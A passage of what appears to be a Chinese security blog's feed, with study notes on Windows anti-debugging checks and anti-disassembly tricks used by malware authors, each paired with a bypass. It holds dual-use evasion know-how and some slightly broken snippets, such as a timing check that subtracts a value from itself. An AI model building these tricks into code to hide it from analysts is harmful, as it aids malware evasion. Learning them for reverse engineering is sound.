class="comment">;获取PEB的地址</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于BeingDebugged是利用这个成员是否为0来判断进程是否处于调试状态。Ldr成员指向的PEB_LDR_DATA数据区域，如果进程处于调试状态，这个区域填充着特殊字符（0xfeeeeeee）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ProcessHeap[4]是一个数组，关于反调试的是Flag(0xC或者0x40)和ForseFlag(0x10或者0x44)这两个成员。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;调试中的进程和正常运行的进程时不同的，凭借NtGlobalFlag这个未公开的成员可以判断进程是否处于调试状态，<strong>如果该成员的值是0x70得话，那么这个进程处于调试状态。</strong></p><h2 id="2-2：windowsAPI"><a href="#2-2：windowsAPI" class="headerlink" title="2-2：windowsAPI"></a>2-2：windowsAPI</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一下这两个函数是检测IsDebugged这个成员的。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">IsDebuggedPresent</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">CheckRemoteDebuggedPresent</span><span class="params">()</span></span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQueryInformationProcess（)来进行反调试。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">NTSTATUS WINAPI NtQueryInformationProcess（</div><div class="line">  <span class="variable">_In_</span> HANDLE ProcessHandle，</div><div class="line">  <span class="variable">_In_</span> PROCESSINFOCLASS ProcessInformationClass，</div><div class="line">  <span class="variable">_Out_</span> PVOID ProcessInformation，</div><div class="line">  <span class="variable">_In_</span> ULONG ProcessInformationLength，</div><div class="line">  <span class="variable">_Out_opt_</span> PULONG ReturnLength</div><div class="line">）;</div></pre></td></tr></table></figure></p><ul><li><strong>如果第二个参数是ProcessDebugPort的话，通过检查该参数返回的值来判断进程是否被调试，如果返回0，说明没有被调试，否是说明进程正在被调试。</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;OutPutDebugString（）函数用于返回调试信息，如果进程没有被调试，如果调用此函数，该函数会返回失败。利用如下代码<figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">SetLastError</span>(<span class="number">1234</span>)；</div><div class="line"><span class="selector-tag">OutPutDebugString</span>(<span class="string">"Test for Debug"</span>)；<span class="comment">//如果该函数调用成功，不返回错误代码，说明处于被调试</span></div><div class="line"><span class="selector-tag">if</span>(GetLastError()==<span class="number">1234</span>)   <span class="comment">//错误代码没有被更改，说明函数调用正常</span></div><div class="line"><span class="selector-tag">ExitProcess</span>();</div><div class="line"><span class="selector-tag">else</span></div><div class="line">    <span class="selector-tag">RunProcess</span>();</div></pre></td></tr></table></figure></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQuerySystemInformation（）来判断系统是否处于调试状态。<br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">NTSTATUS WINAPI NtQuerySystemInformation（</div><div class="line">  <span class="variable">_In_</span> SYSTEM_INFORMATION_CLASS SystemInformationClass，</div><div class="line">  <span class="variable">_Inout_</span> PVOID SystemInformation，</div><div class="line">  <span class="variable">_In_</span> ULONG SystemInformationLength，</div><div class="line">  <span class="variable">_Out_opt_</span> PULONG ReturnLength</div><div class="line">）;</div></pre></td></tr></table></figure></p><ul><li><p><strong>如果进程处于调试状态，在第一个参数传入SystemKernelDebuggerInformation(0x23)后，返回第二个参数指向的system_kernel_Debug_Information的结构中的Debugedable设置为1.</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用NtQueryObject来判断，当某个调试器在调试进程的时候，系统会创建一个内核调试对象，通过检查内核信息链表来查找是否存在内核调试对象。</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">NTSTATUS NtQueryObject（</div><div class="line">  _In_opt_手柄手柄，</div><div class="line">  _In_ OBJECT_INFORMATION_CLASS ObjectInformationClass，</div><div class="line">  _Out_opt_ PVOID ObjectInformation，</div><div class="line">  _In_ ULONG ObjectInformationLength，</div><div class="line">  _Out_opt_ PULONG ReturnLength</div><div class="line">）;</div><div class="line">typedef <span class="class"><span class="keyword">enum</span> <span class="title">_OBJECT_INFORMATION_CLASS</span> //未公开</span></div><div class="line">&#123; </div><div class="line"> ObjectBasicInformation，</div><div class="line"> ObjectNameInformation，</div><div class="line"> ObjectTypeInformation，</div><div class="line"> ObjectTypesInformation，</div><div class="line"> ObjectHandleFlagInformation </div><div class="line">&#125; OBJECT_INFORMATION_CLASS;</div></pre></td></tr></table></figure></li><li><p><strong>在第二个参数传递ObjectBasicInformation共枚举类型中的ObjectAllTypesInformation(3号)，通过返回在第三个参数中的指针对应的ObjectInformation来查找是否存在调试内核对象。</strong></p></li><li><p>破解：修改传入参数为ObjectBasicInformtion（0号）来避免反调试<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用ZwSetInformationThread（）来隐藏被调试进程以达到反调试的效果。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">NTSTATUS ZwSetInformationThread(</div><div class="line">  _In_ HANDLE          ThreadHandle,</div><div class="line">  _In_ THREADINFOCLASS ThreadInformationClass,</div><div class="line">  _In_ PVOID           ThreadInformation,</div><div class="line">  _In_ ULONG           ThreadInformationLength</div><div class="line">)<span class="comment">;</span></div><div class="line">//ntpsapi.h</div><div class="line">typedef enum _THREADINFOCLASS &#123;</div><div class="line"><span class="built_in">    ThreadBasicInformation,</span></div><div class="line"><span class="built_in">    ThreadTimes,</span></div><div class="line"><span class="built_in">    ThreadPriority,</span></div><div class="line"><span class="built_in">    ThreadBasePriority,</span></div><div class="line"><span class="built_in">    ThreadAffinityMask,</span></div><div class="line"><span class="built_in">    ThreadImpersonationToken,</span></div><div class="line"><span class="built_in">    ThreadDescriptorTableEntry,</span></div><div class="line"><span class="built_in">    ThreadEnableAlignmentFaultFixup,</span></div><div class="line"><span class="built_in">    ThreadEventPair_Reusable,</span></div><div class="line"><span class="built_in">    ThreadQuerySetWin32StartAddress,</span></div><div class="line"><span class="built_in">    ThreadZeroTlsCell,</span></div><div class="line"><span class="built_in">    ThreadPerformanceCount,</span></div><div class="line"><span class="built_in">    ThreadAmILastThread,</span></div><div class="line"><span class="built_in">    ThreadIdealProcessor,</span></div><div class="line"><span class="built_in">    ThreadPriorityBoost,</span></div><div class="line"><span class="built_in">    ThreadSetTlsArrayAddress,</span></div><div class="line"><span class="built_in">    ThreadIsIoPending,</span></div><div class="line"><span class="built_in">    ThreadHideFromDebugger,</span>//这个就是用来将线程对调试器隐藏</div><div class="line"><span class="built_in">    ThreadBreakOnTermination,</span></div><div class="line"><span class="built_in">    ThreadSwitchLegacyState,</span></div><div class="line"><span class="built_in">    ThreadIsTerminated,</span></div><div class="line">    MaxThreadInfoClass</div><div class="line">    &#125; THREADINFOCLASS<span class="comment">;</span></div><div class="line">// end_ntddk end_ntifs</div></pre></td></tr></table></figure></li><li><p>在第二个参数传入ThreadHideFromDebugger,如果进程处于调试状态，该API函数会使调试器和进程终止.</p></li><li>应对方法：修改传入参数，为0即可。</li></ul><h2 id="2-3：检测系统痕迹"><a href="#2-3：检测系统痕迹" class="headerlink" title="2-3：检测系统痕迹"></a>2-3：检测系统痕迹</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过扫描调试器在系统中残留的痕迹来判断进程是否处于调试状态。可以选择注册表HKLM\SOFTWARE\MICROSOTF\WINDOWS NT\CURRENTVERSION\AeDebug或者查看窗口是否存有调试器名称（FindWindow）或者使进程等方面来判断。</p><h1 id="3-TIME-CHECK（时钟检测）"><a href="#3-TIME-CHECK（时钟检测）" class="headerlink" title="3.TIME CHECK（时钟检测）"></a>3.TIME CHECK（时钟检测）</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逐行跟踪代码比正常运行代码所花费的时间多得多。通过比较计算运行代码之间的时间差来判断进程是否处于调试状态。一般的，利用windows提供的时间和CPU的计数器（TSC）来测量时间差。TSC基于cpu内部的计数器，所以计算精度会更高。利用以下伪代码实现<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">Time1</span>=GetTime（）；</div><div class="line">RunCode（）；</div><div class="line"><span class="attribute">Time2</span>=GetTime（）；</div><div class="line"><span class="keyword">if</span>（Time2-Time2&gt;0xfffffffff)</div><div class="line">printf(<span class="string">"Debugged"</span>);</div><div class="line"><span class="keyword">else</span></div><div class="line">   printf(<span class="string">"No Debugged"</span>);</div></pre></td></tr></table></figure></p><h2 id="3-1：rdtsc指令"><a href="#3-1：rdtsc指令" class="headerlink" title="3-1：rdtsc指令"></a>3-1：rdtsc指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU中存在一个名为TSC(时间戳计数器)的64为寄存器。RDTSC是一个读取该寄存器的指令，得到的值高32位存储在EDX中，低32位保存在EAX中。<br>    <img src="https://i.imgur.com/3cLmQNY.png" alt=""></p><h2 id="3-2：利用GetTickCount或者QueryPerformanceCounter来判断"><a href="#3-2：利用GetTickCount或者QueryPerformanceCounter来判断" class="headerlink" title="3-2：利用GetTickCount或者QueryPerformanceCounter来判断"></a>3-2：利用GetTickCount或者QueryPerformanceCounter来判断</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用这两个函数方法和伪代码一样。if（Time2-Time2&gt;0xfffffffff)语句中0xfffffffff是一个处于0xffff到0xffffffff中的一个任意值，因为单步一个指令所用的时间必定大于0xffffffff</p><h1 id="4-干扰调试器"><a href="#4-干扰调试器" class="headerlink" title="4.干扰调试器"></a>4.干扰调试器</h1><h2 id="4-1：陷阱标志SEH反调试"><a href="#4-1：陷阱标志SEH反调试" class="headerlink" title="4-1：陷阱标志SEH反调试"></a>4-1：陷阱标志SEH反调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CPU第9个标志位TF为陷进标志位，当TF位1的时候，CPU进入单步模式，没执行一条指令，就会触发一个单步异常。如果进程处于调试状态，触发异常后，异常会交给调试器，此时不会执行SEH处理函数。如过程序处于非调试状态，则会触发SEH异常处理。如图，在401011处安装一个SEH处理函数，<strong>401024用于置陷进标志位，因为无法直接修改寄存器，先用栈保存寄存器数据，然后修改第8位比特数。</strong>利用nop触发单步异常，如果进程处于调试状态就会触发这个异常，进程转入40102F和401034，如果进程没有处于调试状态，就会转入异常处理函数，然后结束异常处理。【关于陷进标志，请看逆向工程核心原理第566页】<br>    <img src="https://i.imgur.com/OUcDnnS.png" alt=""><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>解决方法：先忽略异常，在SEH处理函数和处理完毕后下断点，运行即可。</strong></p><h2 id="4-2：Int-3结合SEH反调试"><a href="#4-2：Int-3结合SEH反调试" class="headerlink" title="4-2：Int 3结合SEH反调试"></a>4-2：Int 3结合SEH反调试</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Int 3是软件中断，操作码是0xcc，一般反调试的手法都是结合SEH来进行的，如果进程处于调试状态，触发异常后，异常会交给调试器，此时不会执行SEH处理函数，一般这个地方都是设置一个趋于死亡的函数跳转如：mov eax，1；jmp eax。如果程序正常，则异常交给SEH处理函数，通过SEH处理函数，最后回归正常的代码。如图所示：<br>    <img src="https://i.imgur.com/K8Coqhi.png" alt=""></p><ul><li>在调试器选项中勾选忽略所有异常（这里是断点异常）</li><li>在SEH处理函数处（40102A）和结束异常处理后（401044）设置断点。</li><li>运行程序即可。（部分环境下使用单步会使得调试奔溃，建议使用F9运行）<h2 id="4-3：Int-2D"><a href="#4-3：Int-2D" class="headerlink" title="4-3：Int 2D"></a>4-3：Int 2D</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Int 2D是内核模式用于触发断点的指令，在用户模式也是可以执行的，但是调试器不会触发此异常，只是忽略，如果遇到Int 2D指令，调试器无法执行单步指令，知道遇到断点才能中断。如图遇到int 2d断点异常。<br>  <img src="https://i.imgur.com/h3a7ZIV.png" alt=""></li><li>使用隐藏OD插件吧，我调了很久还是过不了.<h2 id="4-4：TLS反调试"><a href="#4-4：TLS反调试" class="headerlink" title="4-4：TLS反调试"></a>4-4：TLS反调试</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;利用TLS（线程本地存储技术）可以让代码优先于程序制动的OEP入口点运行，根据恶意代码查杀实战的说法可以使得一些敏感代码处于TLS回调函数中优先执行，这样就不会被调试，我想采取更加积极主动的反调试措施，在TLS回调函数中直接插入反调试代码进行反调试（书上只是隐藏关键代码）。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;解决方法：利用TLS技术，程序会产生TLS节区，如果存在这个节区就要怀疑程序使用了反调试，我们应该设置调试器，中断在system Break-Poit让od在tls回调函数之前暂停。<strong>关于TLS反调试技术请见浅谈TLS反调试技术。</strong><h1 id="5-调试器特征检测"><a href="#5-调试器特征检测" class="headerlink" title="5.调试器特征检测"></a>5.调试器特征检测</h1><h2 id="5-1：0xcc检测"><a href="#5-1：0xcc检测" class="headerlink" title="5-1：0xcc检测"></a>5-1：0xcc检测</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0xCC是软件断点的机器码，od在下断点的时候是否0xCC来代替原指令，但是又偷梁换柱的显示的是原指令，这样起到了中断的效果。但是，单纯的检测0xCC指令是不对的，因为很多其他指令也是使用0xCC机器码（移位，立即数）。<h2 id="5-2：API检测"><a href="#5-2：API检测" class="headerlink" title="5-2：API检测"></a>5-2：API检测</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们如果要调试一个程序的局部功能，最简单的方法是对API函数下个断点，然后执行到返回（或者根据堆栈查看返回地址）所以这种API下断也成为恶意代码编写者设置反调试的重点区域。在机器码层面上，调试器如果对某个API下断，其首个机器码变成0xcc（但是没显示出来）通过检测API的首个机器码来判断程序是否被调试。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>解决方法：不对API函数的第一条指令下断点，或者使用硬件断点（0xcc属于软件断点）</strong><h2 id="5-3：求校验和"><a href="#5-3：求校验和" class="headerlink" title="5-3：求校验和"></a>5-3：求校验和</h2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;微小的更改都可以使得代码缓冲区校验和发生改变，通过比较原始校验和和新校验和的值来判断是否进行调试。<h1 id="6-利用调试器的漏洞"><a href="#6-利用调试器的漏洞" class="headerlink" title="6.利用调试器的漏洞"></a>6.利用调试器的漏洞</h1>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;od1.0版本存在两个PE结构处理的漏洞，所以可以凭此来反调试，但是在2.0已经修复了该漏洞。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-反调试技术：&quot;&gt;&lt;a href=&quot;#1-反调试技术：&quot; class=&quot;headerlink&quot; title=&quot;1.反调试技术：&quot;&gt;&lt;/a&gt;1.反调试技术：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;恶意代码编写者利用反调试技术来判断恶意代码是否被调试，以此来阻止调试器分析，或者使调试器失效。&lt;strong&gt;注意，也可以使用反调试来保护我们的加密代码，不一定是干扰或者破坏调试器，&lt;/strong&gt;&lt;br&gt;参考资料：&lt;br&gt;1.逆向工程核心原理&lt;br&gt;2.恶意代码分析实战&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>反汇编对抗技术[读书笔记]</title>
    <link href="http://yoursite.com/2018/02/17/%E5%AF%B9%E6%8A%97%E5%8F%8D%E6%B1%87%E7%BC%96%E6%8A%80%E6%9C%AF/"/>
    <id>http://yoursite.com/2018/02/17/对抗反汇编技术/</id>
    <published>2018-02-17T08:45:11.000Z</published>
    <updated>2018-02-18T10:54:55.852Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-什么是反汇编对抗技术"><a href="#1-什么是反汇编对抗技术" class="headerlink" title="1.什么是反汇编对抗技术"></a>1.什么是反汇编对抗技术</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>对抗反汇编技术就是在程序中使用一些特殊的代码或者数据，让反汇编工具产生不正确的程序代码列表，这种技术由恶意软件编写者手工构造。对抗反汇编的时候，编写者会创建一段代码序列，欺骗反汇编器，使得反汇编器生成与正常代码不同的代码。一般的对抗反汇编的技术利用的是反汇编器的自身反汇编的缺陷来实施的</strong><br><a id="more"></a></p><h1 id="2-反汇编的两种基本策略"><a href="#2-反汇编的两种基本策略" class="headerlink" title="2.反汇编的两种基本策略"></a>2.反汇编的两种基本策略</h1><h2 id="2-1-线性反汇编"><a href="#2-1-线性反汇编" class="headerlink" title="2-1.线性反汇编"></a>2-1.线性反汇编</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;线性反汇编是遍历整个代码段，一次一条指令的线性汇编，这样造成一个很严重的漏洞—-不区分代码和数据。如下代码：在一个线性反汇编工具会反汇编0ff_401050处的数据【变成代码】。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">jmp</span> <span class="built_in">ds</span>:off_401050[<span class="built_in">eax</span>*<span class="number">4</span>]<span class="comment">; switch数组</span></div><div class="line"><span class="comment">;switch cases</span></div><div class="line"><span class="symbol">code_1:</span></div><div class="line"><span class="symbol">code_2:</span></div><div class="line">···</div><div class="line"><span class="keyword">xor</span> <span class="built_in">eax</span>,<span class="built_in">eax</span></div><div class="line"><span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line"><span class="keyword">retn</span></div><div class="line"><span class="comment">;---------------------------------</span></div><div class="line">off_401050：<span class="built_in">dd</span> offset loc_401020  </div><div class="line">            <span class="built_in">dd</span> offset loc_401027</div><div class="line">            <span class="built_in">dd</span> offset loc_40102e</div><div class="line"><span class="built_in">dd</span> offset loc_401035</div></pre></td></tr></table></figure></p><h2 id="2-2-递归下降策略"><a href="#2-2-递归下降策略" class="headerlink" title="2-2.递归下降策略"></a>2-2.递归下降策略</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用递归下降策略的反汇编器（IDA）反汇编时会检查每个指令，并且为这些指令创建一个需要反汇编的地址表。<strong>一般的使用这种策略的反汇编器在处理条件跳转的时候都会优先反汇编False的分支，</strong>有很多对抗反汇编的方法都是针对这种特性来指定的。如下第一段代码是对抗反汇编的代码，经过修改后的如代码2所示，这就利用了反汇编器优先反汇编false分支（68 65 6c 6c 6f 00处的数据）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CA+1</div><div class="line">68 65 6c 6c 6f             push 6f6c6c65h   ;显然这是一个错误地址，68h是h的ASCII码，代表的机器码是push</div><div class="line">                           loc_4011CA:</div><div class="line">00 58 c3                   add [edx-3dh],bl</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">E8 06 00 00 00             call  near ptr loc_4011CB</div><div class="line">68 65 6c 6c 6f 00          db &quot;hello&quot;,00      ;数据</div><div class="line">                           loc_4011CB:</div><div class="line">58                         pop eax</div><div class="line">c3                         retn</div></pre></td></tr></table></figure><h1 id="3-基于条件跳转的对抗反汇编"><a href="#3-基于条件跳转的对抗反汇编" class="headerlink" title="3.基于条件跳转的对抗反汇编"></a>3.基于条件跳转的对抗反汇编</h1><h2 id="3-1-相同目标的跳转指令"><a href="#3-1-相同目标的跳转指令" class="headerlink" title="3-1.相同目标的跳转指令"></a>3-1.相同目标的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种反汇编技术是使用指向同一个地址的两个连续的条件跳转实现的。通常，恶意代码编写者会构造一个特殊的机器码(如E8，E9)插入的代码中来干扰反汇编。如code_1所示：这个是被处理好的反汇编列表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">                        db e8h    ;构造的数据E8H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">74 03                   jz   short near ptr loc_4011C5</div><div class="line">75 01                   jnz  short near ptr loc_4011C5</div><div class="line">                        loc_4001c4:</div><div class="line">E8 58 C3 90 90          call 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure><h2 id="3-2：固定条件的跳转指令"><a href="#3-2：固定条件的跳转指令" class="headerlink" title="3-2：固定条件的跳转指令"></a>3-2：固定条件的跳转指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通过构造确定条件的条件跳转（如 xor eax,eax jz xxxx）来实现对抗反汇编，因为反汇编器只会处理false分支，存在条件跳转，其不会判断跳转是否是必然的结果。如代码1所示是一个正常的代码清单，但是没有经过处理是是代码2.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C5</div><div class="line">;----------------------------------------------------</div><div class="line">E9                        db e9h    ;构造的数据E9H</div><div class="line">                        loc_4001c5</div><div class="line">58                      pop  </div><div class="line">c3                      retn</div></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">33 c0                   xor eax,eax</div><div class="line">74 01                   jz  short near ptr loc_4011C4+1</div><div class="line">                        loc_4001c4:</div><div class="line">E9 58 C3 68 94          jmp 90D0D521h         ;错误的地址</div></pre></td></tr></table></figure><h2 id="3-3-无效的反汇编指令"><a href="#3-3-无效的反汇编指令" class="headerlink" title="3-3:无效的反汇编指令"></a>3-3:无效的反汇编指令</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同一个字节作为两个不同指令的子集出现的时候，我们应该适当的选取，把不用的字节nop掉。</p><h1 id="4-混淆控制流图"><a href="#4-混淆控制流图" class="headerlink" title="4.混淆控制流图"></a>4.混淆控制流图</h1><h2 id="4-1：函数指针问题"><a href="#4-1：函数指针问题" class="headerlink" title="4-1：函数指针问题"></a>4-1：函数指针问题</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用函数指针，可以减少反汇编器推导出有效的信息量。如code1所示：是在sub_4011d0中调用sub_4011c0，在4011d5处引用了指针，但是也只是在该处使用了交叉引用，但是没有在4011de和4011e9两个调用sub_4011c0函数的地方采取交叉引用。<strong>解决方法是对var_4进行重命名</strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">1011c0   sub_4011c0</div><div class="line">4011c0   arg_0       =<span class="built_in">dword</span> pro <span class="number">8</span></div><div class="line">4011c0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011c1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">                     <span class="comment">;code_sub4011C0</span></div><div class="line">4011ca               sub_4011c0 endp</div><div class="line">4011d0   sub_4011d0</div><div class="line">4011d0               <span class="keyword">push</span> <span class="built_in">ebp</span></div><div class="line">4011d1               <span class="keyword">mov</span> <span class="built_in">ebp</span> <span class="built_in">esp</span></div><div class="line">4011d3               <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line">4011d5               <span class="keyword">mov</span> [<span class="built_in">ebp</span>+var_4],sub_4011c0</div><div class="line">4011dc               <span class="keyword">push</span> <span class="number">2Ah</span></div><div class="line">4011de               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]      </div><div class="line">4011E1               <span class="keyword">add</span> <span class="built_in">esp</span>,<span class="number">4</span></div><div class="line">4011e4               <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line">4011e6               <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line">4011e9               <span class="keyword">call</span> [<span class="built_in">ebp</span>+var_4]</div></pre></td></tr></table></figure></p><h2 id="4-1-滥用返回指针"><a href="#4-1-滥用返回指针" class="headerlink" title="4-1.滥用返回指针"></a>4-1.滥用返回指针</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在ret不以函数调用的方式放回时会出现一下代码清单。call $+5的目的是在400c5压入栈中，而[esp+4+var_4]其实就是esp栈顶。其数值是4011c5，加5，就是4011ca，在ret到4011c5处执行代码！<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="number">4011</span>c0   sub_4011c0</div><div class="line"><span class="number">4011</span>c0   var_4       =byte ptr <span class="number">-4</span></div><div class="line"><span class="number">4011</span>c0               call $+<span class="number">5</span></div><div class="line"><span class="number">4011</span>c5               add [esp+<span class="number">4</span>+var_4],<span class="number">5</span></div><div class="line"><span class="number">4011</span>c9               ret</div><div class="line"><span class="number">4011</span>c9               sub_4011c0 endp ;sp -analysis failed</div><div class="line"><span class="number">4011</span>ca               ;----------------------------------</div><div class="line"><span class="number">4011</span>ca               push ebp</div><div class="line"><span class="number">4011</span>cb               mov ebp esp</div><div class="line"><span class="number">4011</span>cd               ；CodeFun</div><div class="line"><span class="number">4011</span>d0               retn</div></pre></td></tr></table></figure></p><h2 id="4-3-滥用SEH处理函数。"><a 